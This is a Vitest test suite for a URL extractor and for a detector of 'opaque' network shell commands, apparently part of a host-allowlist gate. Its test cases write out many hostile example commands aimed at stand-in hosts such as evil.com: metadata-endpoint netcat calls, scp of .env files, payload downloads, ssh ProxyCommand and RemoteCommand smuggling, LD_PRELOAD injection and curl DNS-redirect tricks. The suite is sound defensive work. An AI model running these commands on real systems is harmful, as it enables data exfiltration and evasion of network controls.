import { describe, expect, it } from "vitest";
import {
	extractAllUrls,
	extractUrlsFromShellCommand,
	extractUrlsFromValue,
	findOpaqueNetworkShellCommand,
} from "../../src/utils/url-extractor.js";

describe("extractUrlsFromValue", () => {
	describe("string values", () => {
		it("extracts single HTTP URL", () => {
			expect(extractUrlsFromValue("Check http://example.com")).toEqual([
				"http://example.com",
			]);
		});

		it("extracts single HTTPS URL", () => {
			expect(extractUrlsFromValue("Visit https://example.com")).toEqual([
				"https://example.com",
			]);
		});

		it("extracts multiple URLs", () => {
			expect(
				extractUrlsFromValue(
					"See https://one.com and http://two.com for details",
				),
			).toEqual(["https://one.com", "http://two.com"]);
		});

		it("extracts URL with path", () => {
			expect(
				extractUrlsFromValue("API at https://api.example.com/v1/users"),
			).toEqual(["https://api.example.com/v1/users"]);
		});

		it("extracts URL with query parameters", () => {
			expect(
				extractUrlsFromValue("Link: https://example.com/search?q=test&page=1"),
			).toEqual(["https://example.com/search?q=test&page=1"]);
		});

		it("strips trailing punctuation", () => {
			expect(extractUrlsFromValue("See https://example.com.")).toEqual([
				"https://example.com",
			]);
			expect(extractUrlsFromValue("Link: https://example.com,")).toEqual([
				"https://example.com",
			]);
			expect(extractUrlsFromValue("(https://example.com)")).toEqual([
				"https://example.com",
			]);
		});

		it("returns empty array for no URLs", () => {
			expect(extractUrlsFromValue("No URLs here")).toEqual([]);
		});

		it("returns empty array for empty string", () => {
			expect(extractUrlsFromValue("")).toEqual([]);
		});
	});

	describe("object values", () => {
		it("extracts from simple object", () => {
			expect(extractUrlsFromValue({ url: "https://example.com" })).toEqual([
				"https://example.com",
			]);
		});

		it("extracts from nested object", () => {
			expect(
				extractUrlsFromValue({
					config: {
						api: {
							endpoint: "https://api.example.com",
						},
					},
				}),
			).toEqual(["https://api.example.com"]);
		});

		it("extracts from multiple properties", () => {
			const result = extractUrlsFromValue({
				primary: "https://one.com",
				secondary: "https://two.com",
			});
			expect(result).toContain("https://one.com");
			expect(result).toContain("https://two.com");
		});
	});

	describe("array values", () => {
		it("extracts from string array", () => {
			expect(
				extractUrlsFromValue(["https://one.com", "https://two.com"]),
			).toEqual(["https://one.com", "https://two.com"]);
		});

		it("extracts from mixed array", () => {
			expect(
				extractUrlsFromValue([
					"https://one.com",
					{ url: "https://two.com" },
					["https://three.com"],
				]),
			).toEqual(["https://one.com", "https://two.com", "https://three.com"]);
		});
	});

	describe("edge cases", () => {
		it("handles null", () => {
			expect(extractUrlsFromValue(null)).toEqual([]);
		});

		it("handles undefined", () => {
			expect(extractUrlsFromValue(undefined)).toEqual([]);
		});

		it("handles numbers", () => {
			expect(extractUrlsFromValue(42)).toEqual([]);
		});

		it("handles booleans", () => {
			expect(extractUrlsFromValue(true)).toEqual([]);
		});
	});
});

describe("extractUrlsFromShellCommand", () => {
	describe("curl commands", () => {
		it("extracts URL from simple curl", () => {
			expect(extractUrlsFromShellCommand("curl https://example.com")).toEqual([
				"https://example.com",
			]);
		});

		it("keeps URL operands after curl boolean flags", () => {
			expect(
				extractUrlsFromShellCommand("curl -i https://example.com"),
			).toEqual(["https://example.com"]);
			expect(
				extractUrlsFromShellCommand("curl -p https://example.com"),
			).toEqual(["https://example.com"]);
		});

		it("extracts URL from curl with flags (includes flag values)", () => {
			// Note: Flag values like POST are also captured - caller should filter if needed
			const result = extractUrlsFromShellCommand(
				"curl -X POST https://api.example.com",
			);
			expect(result).toContain("https://api.example.com");
		});

		it("adds http:// to bare hostname", () => {
			expect(extractUrlsFromShellCommand("curl example.com/api")).toEqual([
				"http://example.com/api",
			]);
		});

		it("adds http:// to localhost targets", () => {
			expect(extractUrlsFromShellCommand("curl localhost:3000/api")).toEqual([
				"http://localhost:3000/api",
			]);
		});

		it("extracts URL from quoted argument", () => {
			expect(
				extractUrlsFromShellCommand('curl "https://example.com/path"'),
			).toEqual(["https://example.com/path"]);
		});
	});

	describe("wget commands", () => {
		it("extracts URL from simple wget", () => {
			expect(extractUrlsFromShellCommand("wget https://example.com")).toEqual([
				"https://example.com",
			]);
		});

		it("extracts URL from wget with flags (includes flag values)", () => {
			// Note: Flag values are also captured - caller should filter if needed
			const result = extractUrlsFromShellCommand(
				"wget -O output.txt https://example.com",
			);
			expect(result).toContain("https://example.com");
		});

		it("adds http:// to bare hostname", () => {
			expect(extractUrlsFromShellCommand("wget example.com/file.zip")).toEqual([
				"http://example.com/file.zip",
			]);
		});
	});

	describe("edge cases", () => {
		it("returns empty array for non-curl/wget commands", () => {
			expect(extractUrlsFromShellCommand("echo hello")).toEqual([]);
		});

		it("ignores URL literals in non-network commands", () => {
			expect(
				extractUrlsFromShellCommand("echo https://example.com | grep example"),
			).toEqual([]);
			expect(extractUrlsFromShellCommand("echo https://evil.com")).toEqual([]);
			expect(
				extractUrlsFromShellCommand("grep https://evil.com README.md"),
			).toEqual([]);
		});

		it("returns empty array for empty string", () => {
			expect(extractUrlsFromShellCommand("")).toEqual([]);
		});

		it("handles command with pipe", () => {
			expect(
				extractUrlsFromShellCommand("curl https://example.com | grep test"),
			).toEqual(["https://example.com"]);
		});

		it("strips trailing punctuation", () => {
			expect(extractUrlsFromShellCommand("curl https://example.com;")).toEqual([
				"https://example.com",
			]);
		});

		it("does not add http:// for whitespace-only or empty argument", () => {
			expect(extractUrlsFromShellCommand('curl "  "')).toEqual([]);
			expect(extractUrlsFromShellCommand("curl ''")).toEqual([]);
		});
	});

	describe("network egress commands", () => {
		it("extracts netcat host targets", () => {
			expect(extractUrlsFromShellCommand("nc 169.254.169.254 80")).toEqual([
				"http://169.254.169.254",
			]);
		});

		it("extracts git HTTPS and scp-style remotes", () => {
			expect(
				extractUrlsFromShellCommand("git clone https://evil.com/repo.git"),
			).toContain("https://evil.com/repo.git");
			expect(
				extractUrlsFromShellCommand("git svn clone https://evil.com/repo.git"),
			).toContain("https://evil.com/repo.git");
			expect(
				extractUrlsFromShellCommand("git clone git@evil.com:org/repo.git"),
			).toContain("http://evil.com");
			expect(
				extractUrlsFromShellCommand(
					"git archive --remote=git@evil.com:org/repo.git HEAD",
				),
			).toContain("http://evil.com");
			expect(
				extractUrlsFromShellCommand(
					"git submodule add https://evil.com/repo.git vendor/repo",
				),
			).toContain("https://evil.com/repo.git");
			expect(
				extractUrlsFromShellCommand(
					"git submodule add -b main --name vendored https://evil.com/repo.git vendor/repo",
				),
			).toContain("https://evil.com/repo.git");
		});

		it("extracts git remotes after global options", () => {
			expect(
				extractUrlsFromShellCommand(
					"git -C /tmp/repo -c core.sshCommand=ssh clone https://evil.com/repo.git",
				),
			).toContain("https://evil.com/repo.git");
		});

		it("extracts git config URL targets", () => {
			expect(
				extractUrlsFromShellCommand(
					"git config remote.origin.url https://evil.com/repo.git",
				),
			).toContain("https://evil.com/repo.git");
			expect(
				extractUrlsFromShellCommand(
					'git config --global url."https://evil.com/".insteadOf https://github.com/',
				),
			).toContain("https://evil.com/");
		});

		it("extracts git archive remotes from --remote flags", () => {
			expect(
				extractUrlsFromShellCommand(
					"git archive --remote=https://evil.com/repo.git HEAD",
				),
			).toContain("https://evil.com/repo.git");
			expect(
				extractUrlsFromShellCommand(
					"git archive --remote=git@evil.com:org/repo.git HEAD",
				),
			).toContain("http://evil.com");
		});

		it("extracts ssh user host targets without a path separator", () => {
			expect(extractUrlsFromShellCommand("ssh user@github.com")).toEqual([
				"http://github.com",
			]);
		});

		it("extracts scp remotes with short hostnames", () => {
			expect(extractUrlsFromShellCommand("scp .env host:/tmp")).toEqual([
				"http://host",
			]);
			expect(extractUrlsFromShellCommand("scp src user@mybox:/dst")).toEqual([
				"http://mybox",
			]);
		});

		it("extracts rsync remotes across ssh-style, rsync://, and daemon (::) syntaxes", () => {
			expect(
				extractUrlsFromShellCommand("rsync -av src/ user@evil.com:/dst/"),
			).toEqual(["http://evil.com"]);
			expect(
				extractUrlsFromShellCommand("rsync -av src/ rsync://evil.com/path"),
			).toEqual(["http://evil.com"]);
			expect(
				extractUrlsFromShellCommand(
					"rsync -av src/ rsync://user@evil.com:8730/path",
				),
			).toEqual(["http://evil.com"]);
			expect(
				extractUrlsFromShellCommand("rsync -av src/ host::module/path"),
			).toEqual(["http://host"]);
			expect(extractUrlsFromShellCommand("rsync -av ./src/ ./dst/")).toEqual(
				[],
			);
		});

		// Regression: rsync(1) repurposes seven curl/wget value-taking short
		// flags as booleans (`-i` itemize-changes, `-o` preserve-owner, `-H`
		// preserve-hardlinks, `-c` checksum, `-A` preserve-ACLs, `-p`
		// preserve-permissions, `-u` update-only). Before the rsync-specific
		// value-flag table, the generic `nonFlagArgs` parser silently
		// consumed the next positional — the `user@host:path` remote — and
		// `findOpaqueNetworkShellCommand` classified the command as fully
		// local. Each row asserted individually so a future regression in
		// any single flag is unambiguous in the test output. (Re-applies
		// the Cursor Bugbot fix from PR #2732 that was lost in the squash
		// merge.)
		it.each([
			["rsync -i user@evil.com:/src/ /local/dst/", "-i itemize-changes"],
			["rsync -o user@evil.com:/src/ /local/dst/", "-o preserve-owner"],
			["rsync -H user@evil.com:/src/ /local/dst/", "-H preserve-hardlinks"],
			["rsync -c user@evil.com:/src/ /local/dst/", "-c checksum"],
			["rsync -A user@evil.com:/src/ /local/dst/", "-A preserve-ACLs"],
			["rsync -p user@evil.com:/src/ /local/dst/", "-p preserve-permissions"],
			["rsync -u user@evil.com:/src/ /local/dst/", "-u update-only"],
		])(
			"extracts the remote host even when an rsync boolean (%s) precedes it",
			(command) => {
				expect(extractUrlsFromShellCommand(command)).toEqual([
					"http://evil.com",
				]);
			},
		);

		// Cursor Bugbot finding on PR #2756: the symmetric case. The
		// rsync-specific value-flag table that closed the boolean-misparse
		// bypass also added new value-taking entries (`--exclude`,
		// `--include`, `--info`, `--debug`, `-f`, `-B`, `-T`, …) that the
		// generic table did NOT have. So a crafted command like
		// `rsync --exclude user@evil.com:/src /local` previously caused
		// the parser to eat `user@evil.com:/src` as the exclude value,
		// leave `/local` as the sole positional, and let
		// `rsyncCommandIsLocal` classify the command as fully local —
		// hiding the remote from the allowlist gate.
		//
		// The fix scans ALL args (not just positionals) for tokens that
		// look like remote endpoints, so the remote always reaches URL
		// extraction regardless of which flag swallowed it.
		it.each([
			["rsync --exclude user@evil.com:/src/ /local/dst/", "--exclude"],
			["rsync --include user@evil.com:/src/ /local/dst/", "--include"],
			["rsync --info user@evil.com:/src/ /local/dst/", "--info"],
			["rsync --debug user@evil.com:/src/ /local/dst/", "--debug"],
			["rsync -f user@evil.com:/src/ /local/dst/", "-f filter rule"],
			["rsync -B user@evil.com:/src/ /local/dst/", "-B block size"],
			["rsync -T user@evil.com:/src/ /local/dst/", "-T temp dir"],
		])(
			"extracts the remote host even when an rsync value-taking flag (%s) swallows it",
			(command) => {
				expect(extractUrlsFromShellCommand(command)).toEqual([
					"http://evil.com",
				]);
			},
		);

		it("extracts escaped network command names", () => {
			expect(extractUrlsFromShellCommand("c\\url http://evil.com")).toEqual([
				"http://evil.com",
			]);
		});

		// Validation-pass finding: the tokenizer split on `;`, `&`, `|`
		// but NOT on `\n`/`\r`. `echo hi\nssh user@evil.com` was folded
		// into one giant non-network command and the SSH leg slipped
		// past the allowlist gate. bash treats newlines as command-list
		// separators identical to `;`, so the parser must too.
		it.each([
			["echo hi\nssh user@evil.com", "\\n"],
			["echo hi\r\nssh user@evil.com", "\\r\\n"],
			["echo a; echo b\nssh user@evil.com", "mixed `;` and `\\n`"],
			["echo a\nssh user@evil.com\necho b", "embedded between echoes"],
		])("treats %s as a command separator (%s)", (command) => {
			expect(extractUrlsFromShellCommand(command)).toContain("http://evil.com");
		});

		// Validation-pass finding: bash-style bare env-var prefix
		// (`VAR=value cmd args`) lets a caller smuggle a transport
		// override (`GIT_SSH_COMMAND='ssh -o ProxyCommand=nc evil 22'`)
		// past the host check — the policy validates `github.com` from
		// `git clone github.com:o/r`, but the actual SSH transport is
		// the attacker-supplied `nc evil 22` command. We treat any
		// non-empty assignment to one of the dangerous variables as
		// opaque, the same way we treat ssh `-o ProxyCommand=`.
		it.each([
			[
				"GIT_SSH_COMMAND='ssh -o ProxyCommand=nc' git clone git@github.com:o/r",
				"GIT_SSH_COMMAND",
			],
			["GIT_SSH=/tmp/evil-ssh git clone git@github.com:o/r", "GIT_SSH"],
			[
				"RSYNC_RSH='ssh -o ProxyCommand=nc' rsync src u@github.com:/d",
				"RSYNC_RSH",
			],
			["LD_PRELOAD=/tmp/evil.so curl https://github.com", "LD_PRELOAD"],
			[
				"DYLD_INSERT_LIBRARIES=/tmp/evil.dylib curl https://github.com",
				"DYLD_INSERT_LIBRARIES",
			],
			[
				"BASH_ENV=/tmp/evil bash -c 'curl evil.com'",
				"BASH_ENV (around a shell wrapper)",
			],
			["CURL_HOME=/tmp/atk curl https://github.com", "CURL_HOME"],
		])(
			"flags %s as opaque even when the wrapped command's host looks valid (%s)",
			(command) => {
				expect(findOpaqueNetworkShellCommand(command)).not.toBeNull();
			},
		);

		it("benign env-var prefixes pass through to the underlying command", () => {
			// Harmless env vars (HTTPS_PROXY, FOO=bar, …) should not
			// trigger the opaque path, and the wrapped command's host
			// should still surface for the allowlist gate.
			expect(
				extractUrlsFromShellCommand("HTTPS_PROXY= curl https://github.com"),
			).toContain("https://github.com");
			expect(
				findOpaqueNetworkShellCommand("HTTPS_PROXY= curl https://github.com"),
			).toBeNull();
			expect(
				extractUrlsFromShellCommand("FOO=bar BAR=baz curl https://github.com"),
			).toContain("https://github.com");
		});

		it("extracts targets behind command wrappers", () => {
			expect(
				extractUrlsFromShellCommand("busybox wget evil.com/payload"),
			).toEqual(["http://evil.com/payload"]);
			expect(extractUrlsFromShellCommand("doas curl evil.com")).toEqual([
				"http://evil.com",
			]);
			expect(extractUrlsFromShellCommand("doas -u root curl evil.com")).toEqual(
				["http://evil.com"],
			);
			expect(extractUrlsFromShellCommand("sudo curl evil.com")).toEqual([
				"http://evil.com",
			]);
			expect(extractUrlsFromShellCommand("time -p curl evil.com")).toEqual([
				"http://evil.com",
			]);
			expect(extractUrlsFromShellCommand("timeout 5 curl evil.com")).toEqual([
				"http://evil.com",
			]);
			expect(
				extractUrlsFromShellCommand("env FOO=bar nc 169.254.169.254 80"),
			).toEqual(["http://169.254.169.254"]);
			expect(
				extractUrlsFromShellCommand("exec bash -c 'curl evil.com'"),
			).toEqual(["http://evil.com"]);
			expect(
				extractUrlsFromShellCommand("exec -a worker bash -c 'curl evil.com'"),
			).toEqual(["http://evil.com"]);
			expect(extractUrlsFromShellCommand("xargs curl evil.com")).toEqual([
				"http://evil.com",
			]);
		});

		it("extracts targets from find exec commands", () => {
			expect(
				extractUrlsFromShellCommand("find . -exec curl evil.com \\;"),
			).toEqual(["http://evil.com"]);
		});

		it("extracts targets inside shell -c wrappers", () => {
			expect(
				extractUrlsFromShellCommand(
					'bash -c "curl evil.com && ssh user@github.com"',
				),
			).toEqual(["http://evil.com", "http://github.com"]);
			expect(
				extractUrlsFromShellCommand("bash -lc 'nc 169.254.169.254 80'"),
			).toEqual(["http://169.254.169.254"]);
			expect(extractUrlsFromShellCommand("bash -ce 'curl evil.com'")).toEqual([
				"http://evil.com",
			]);
			expect(extractUrlsFromShellCommand("bash -c'curl evil.com'")).toEqual([
				"http://evil.com",
			]);
			expect(extractUrlsFromShellCommand("bash -lc'curl evil.com'")).toEqual([
				"http://evil.com",
			]);
			expect(
				extractUrlsFromShellCommand("bash -lic 'ssh user@github.com'"),
			).toEqual(["http://github.com"]);
			expect(
				extractUrlsFromShellCommand("bash --command 'curl evil.com'"),
			).toEqual(["http://evil.com"]);
			expect(
				extractUrlsFromShellCommand("dash -c 'wget evil.com/payload'"),
			).toEqual(["http://evil.com/payload"]);
			expect(
				extractUrlsFromShellCommand(
					"bash -rcfile /tmp/bashrc -c 'curl evil.com'",
				),
			).toEqual(["http://evil.com"]);
			expect(
				extractUrlsFromShellCommand("bash -o pipefail -c 'curl evil.com'"),
			).toEqual(["http://evil.com"]);
			expect(
				extractUrlsFromShellCommand("bash -norc -c 'curl evil.com'"),
			).toEqual(["http://evil.com"]);
		});

		it("extracts targets inside command substitutions", () => {
			expect(
				extractUrlsFromShellCommand(
					"echo $(curl evil.com) $(ssh user@github.com)",
				),
			).toEqual(["http://evil.com", "http://github.com"]);
			expect(extractUrlsFromShellCommand("echo $(curl evil.com)")).toEqual([
				"http://evil.com",
			]);
			expect(
				extractUrlsFromShellCommand("printf '%s' `wget evil.com/payload`"),
			).toEqual(["http://evil.com/payload"]);
		});

		it("extracts targets inside subshell groups", () => {
			expect(extractUrlsFromShellCommand("( curl evil.com )")).toEqual([
				"http://evil.com",
			]);
			expect(extractUrlsFromShellCommand("echo ok\n( curl evil.com )")).toEqual(
				["http://evil.com"],
			);
			expect(
				extractUrlsFromShellCommand("echo ok && ( ssh user@github.com )"),
			).toEqual(["http://github.com"]);
		});

		it("extracts targets inside process substitutions", () => {
			expect(extractUrlsFromShellCommand("cat <(curl evil.com)")).toEqual([
				"http://evil.com",
			]);
		});

		it("keeps bracketed IPv6 URL hosts intact", () => {
			expect(extractUrlsFromShellCommand("curl http://[::1]")).toEqual([
				"http://[::1]",
			]);
		});
	});

	describe("findOpaqueNetworkShellCommand", () => {
		it("flags network commands without a statically visible host", () => {
			expect(findOpaqueNetworkShellCommand("git fetch origin")).toBe(
				"git fetch origin",
			);
			expect(
				findOpaqueNetworkShellCommand("git fetch origin https://github.com"),
			).toBe("git fetch origin https://github.com");
			expect(
				findOpaqueNetworkShellCommand("git remote add origin $REMOTE"),
			).toBe("git remote add origin $REMOTE");
			expect(findOpaqueNetworkShellCommand("sudo git fetch origin")).toBe(
				"git fetch origin",
			);
			expect(findOpaqueNetworkShellCommand("busybox wget $TARGET")).toBe(
				"wget $TARGET",
			);
			expect(findOpaqueNetworkShellCommand("doas curl $TARGET")).toBe(
				"curl $TARGET",
			);
			expect(findOpaqueNetworkShellCommand("doas -u root curl $TARGET")).toBe(
				"curl $TARGET",
			);
			expect(
				findOpaqueNetworkShellCommand(
					"git -C /tmp/repo -c foo.bar=baz fetch origin",
				),
			).toBe("git -C /tmp/repo -c foo.bar=baz fetch origin");
			expect(findOpaqueNetworkShellCommand("git lfs fetch origin")).toBe(
				"git lfs fetch origin",
			);
			expect(findOpaqueNetworkShellCommand("nc $TARGET 80")).toBe(
				"nc $TARGET 80",
			);
			expect(
				findOpaqueNetworkShellCommand("nc $TARGET https://github.com"),
			).toBe("nc $TARGET https://github.com");
			expect(findOpaqueNetworkShellCommand("env nc $TARGET 80")).toBe(
				"nc $TARGET 80",
			);
			expect(findOpaqueNetworkShellCommand("time -p curl $TARGET")).toBe(
				"curl $TARGET",
			);
			expect(findOpaqueNetworkShellCommand("timeout 5 curl $TARGET")).toBe(
				"curl $TARGET",
			);
			expect(findOpaqueNetworkShellCommand('bash -c "git fetch origin"')).toBe(
				"git fetch origin",
			);
			expect(findOpaqueNetworkShellCommand("bash -ce 'curl $TARGET'")).toBe(
				"curl $TARGET",
			);
			expect(findOpaqueNetworkShellCommand("bash -c'git fetch origin'")).toBe(
				"git fetch origin",
			);
			expect(
				findOpaqueNetworkShellCommand("bash -lic 'git fetch origin'"),
			).toBe("git fetch origin");
			expect(
				findOpaqueNetworkShellCommand("bash --command 'git fetch origin'"),
			).toBe("git fetch origin");
			expect(findOpaqueNetworkShellCommand("dash -c 'git fetch origin'")).toBe(
				"git fetch origin",
			);
			expect(
				findOpaqueNetworkShellCommand(
					"bash -rcfile /tmp/bashrc -c 'git fetch origin'",
				),
			).toBe("git fetch origin");
			expect(
				findOpaqueNetworkShellCommand("bash -o pipefail -c 'git fetch origin'"),
			).toBe("git fetch origin");
			expect(
				findOpaqueNetworkShellCommand("bash -norc -c 'git fetch origin'"),
			).toBe("git fetch origin");
			expect(
				findOpaqueNetworkShellCommand("exec bash -c 'git fetch origin'"),
			).toBe("git fetch origin");
		});

		it("ignores local git archive commands without remote targets", () => {
			expect(findOpaqueNetworkShellCommand("git archive HEAD")).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("git archive --format=tar HEAD"),
			).toBeNull();
		});

		it("ignores local git remote bookkeeping commands", () => {
			expect(findOpaqueNetworkShellCommand("git remote")).toBeNull();
			expect(findOpaqueNetworkShellCommand("git remote -v")).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("git remote remove origin"),
			).toBeNull();
			expect(findOpaqueNetworkShellCommand("git remote rm origin")).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("git remote rename origin upstream"),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("git remote get-url origin"),
			).toBeNull();
		});

		it("ignores local git config reads", () => {
			expect(
				findOpaqueNetworkShellCommand("git config --get remote.origin.url"),
			).toBeNull();
		});

		it("ignores local git submodule bookkeeping commands", () => {
			expect(findOpaqueNetworkShellCommand("git submodule init")).toBeNull();
			expect(findOpaqueNetworkShellCommand("git submodule sync")).toBeNull();
		});

		it("ignores network commands with extracted targets", () => {
			expect(findOpaqueNetworkShellCommand("nc 169.254.169.254 80")).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git clone -b main https://example.com/repo target-dir",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("git clone https://example.com/repo"),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git remote add origin https://example.com/repo.git",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git remote set-url origin https://example.com/repo.git",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git config remote.origin.url https://example.com/repo.git",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					'git config --global url."https://example.com/".insteadOf https://github.com/',
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git archive --remote=https://example.com/repo.git HEAD",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git archive --remote=git@example.com:org/repo.git HEAD",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("curl https://example.com ./out"),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("curl -i https://example.com"),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("curl -p https://example.com"),
			).toBeNull();
			expect(findOpaqueNetworkShellCommand("ssh user@github.com")).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("scp src user@github.com:/dst"),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("scp user@github.com:/src ./dst"),
			).toBeNull();
			expect(findOpaqueNetworkShellCommand("scp .env host:/tmp")).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("scp src user@mybox:/dst"),
			).toBeNull();
			expect(findOpaqueNetworkShellCommand("command -v curl")).toBeNull();
		});

		it("ignores local-only scp copies but still flags opaque ones", () => {
			expect(findOpaqueNetworkShellCommand("scp ./src ./dst")).toBeNull();
			expect(findOpaqueNetworkShellCommand("scp src.txt dst.txt")).toBeNull();
			expect(findOpaqueNetworkShellCommand("scp $SRC ./dst")).toBe(
				"scp $SRC ./dst",
			);
		});

		it("flags ssh -o options that smuggle commands past host allowlists", () => {
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -o ProxyCommand='nc $TARGET 22' 127.0.0.1",
				),
			).toBe("ssh -o ProxyCommand=nc $TARGET 22 127.0.0.1");
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -oProxyCommand='nc evil.example.com 22' user@github.com",
				),
			).toBe("ssh -oProxyCommand=nc evil.example.com 22 user@github.com");
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -o proxycommand='nc 1.2.3.4 22' 127.0.0.1",
				),
			).toBe("ssh -o proxycommand=nc 1.2.3.4 22 127.0.0.1");
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -o ' ProxyCommand=nc evil.example.com 22' 127.0.0.1",
				),
			).toBe("ssh -o  ProxyCommand=nc evil.example.com 22 127.0.0.1");
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -o RemoteCommand='rm -rf ~' user@github.com",
				),
			).toBe("ssh -o RemoteCommand=rm -rf ~ user@github.com");
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -o PermitLocalCommand=yes -o LocalCommand='curl evil' user@github.com",
				),
			).toBe(
				"ssh -o PermitLocalCommand=yes -o LocalCommand=curl evil user@github.com",
			);
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -o KnownHostsCommand='curl evil/keys' user@github.com",
				),
			).toBe("ssh -o KnownHostsCommand=curl evil/keys user@github.com");
			expect(
				findOpaqueNetworkShellCommand(
					"sftp -o ProxyCommand='nc evil 22' user@github.com",
				),
			).toBe("sftp -o ProxyCommand=nc evil 22 user@github.com");
			expect(
				findOpaqueNetworkShellCommand(
					"sudo ssh -o ProxyCommand='nc $TARGET 22' 127.0.0.1",
				),
			).toBe("ssh -o ProxyCommand=nc $TARGET 22 127.0.0.1");
			expect(
				findOpaqueNetworkShellCommand(
					"bash -c \"ssh -o ProxyCommand='nc $TARGET 22' 127.0.0.1\"",
				),
			).toBe("ssh -o ProxyCommand=nc $TARGET 22 127.0.0.1");
		});

		it("flags ssh -o HostName overrides across the `key=value` parser variants", () => {
			// HostName is the canonical "where the connection really goes"
			// override and is treated as opaque regardless of the positional —
			// even when the override value itself looks like a clean FQDN.
			// The existing "shell-out option families" test covers the
			// whitespace-separated form; these assertions pin the `=`,
			// case-insensitive, no-space, $-substituted, empty, sftp, and scp
			// variants.
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -o HostName=evil.example.com 127.0.0.1",
				),
			).toBe("ssh -o HostName=evil.example.com 127.0.0.1");
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -o hostname=evil.example.com 127.0.0.1",
				),
			).toBe("ssh -o hostname=evil.example.com 127.0.0.1");
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -oHostName=evil.example.com 127.0.0.1",
				),
			).toBe("ssh -oHostName=evil.example.com 127.0.0.1");
			expect(
				findOpaqueNetworkShellCommand("ssh -o HostName=$TARGET 127.0.0.1"),
			).toBe("ssh -o HostName=$TARGET 127.0.0.1");
			expect(findOpaqueNetworkShellCommand("ssh -o HostName= 127.0.0.1")).toBe(
				"ssh -o HostName= 127.0.0.1",
			);
			expect(
				findOpaqueNetworkShellCommand(
					"sftp -o HostName=evil.example.com user@github.com",
				),
			).toBe("sftp -o HostName=evil.example.com user@github.com");
			expect(
				findOpaqueNetworkShellCommand(
					"scp -o HostName=evil.example.com src user@host:/dst",
				),
			).toBe("scp -o HostName=evil.example.com src user@host:/dst");
		});

		it("leaves benign ssh -o options alone", () => {
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -o StrictHostKeyChecking=no user@github.com",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -o ConnectTimeout=10 -o ServerAliveInterval=30 user@github.com",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -i /tmp/key -p 2222 user@github.com",
				),
			).toBeNull();
			// Explicit "no config file" forms are safe.
			expect(
				findOpaqueNetworkShellCommand("ssh -F /dev/null user@github.com"),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("ssh -F none user@github.com"),
			).toBeNull();
		});

		it("flags scp -o options that smuggle commands the same way ssh does", () => {
			expect(
				findOpaqueNetworkShellCommand(
					"scp -o ProxyCommand='nc evil 22' src user@host:/dst",
				),
			).toBe("scp -o ProxyCommand=nc evil 22 src user@host:/dst");
			expect(
				findOpaqueNetworkShellCommand(
					"scp -o RemoteCommand='rm -rf ~' src user@host:/dst",
				),
			).toBe("scp -o RemoteCommand=rm -rf ~ src user@host:/dst");
		});

		it("flags ssh's other shell-out option families", () => {
			for (const option of [
				"Match exec false",
				"ControlPath '|cmd'",
				"SetEnv LD_PRELOAD=/tmp/evil.so",
				"IdentityAgent /tmp/evil.sock",
				"Include /tmp/attacker.cfg",
				"Hostname evil.example.com",
			]) {
				expect(
					findOpaqueNetworkShellCommand(`ssh -o "${option}" user@github.com`),
				).not.toBeNull();
			}
		});

		it.each([
			"curl --resolve github.com:443:evil.ip https://github.com",
			"curl --resolve=github.com:443:evil.ip https://github.com",
			"curl --connect-to github.com:443:evil.com:443 https://github.com",
			"curl --connect-to=github.com:443:evil.com:443 https://github.com",
		])("flags curl DNS-redirect smuggle: %s", (command) => {
			expect(findOpaqueNetworkShellCommand(command)).not.toBeNull();
		});

		it.each([
			"curl -K /tmp/attacker.curlrc https://github.com",
			"curl -K/tmp/attacker.curlrc https://github.com",
			"curl --config /tmp/attacker.curlrc https://github.com",
			"curl --config=/tmp/attacker.curlrc https://github.com",
			"wget --config /tmp/attacker.wgetrc https://github.com",
			"wget --config=/tmp/attacker.wgetrc https://github.com",
		])("flags curl/wget config-file smuggle: %s", (command) => {
			expect(findOpaqueNetworkShellCommand(command)).not.toBeNull();
		});

		it.each([
			"wget -e 'http_proxy=evil.proxy:8080' https://github.com",
			"wget --execute='http_proxy=evil.proxy' https://github.com",
		])("flags wget .wgetrc-style smuggle: %s", (command) => {
			expect(findOpaqueNetworkShellCommand(command)).not.toBeNull();
		});

		it("leaves /dev/null config files and ordinary curl/wget alone", () => {
			expect(
				findOpaqueNetworkShellCommand("curl -K /dev/null https://github.com"),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"curl --config=/dev/null https://github.com",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"wget --config=/dev/null https://github.com",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("curl https://github.com"),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"curl -X POST -H 'Content-Type: application/json' https://github.com",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("wget -O out.txt https://github.com"),
			).toBeNull();
		});

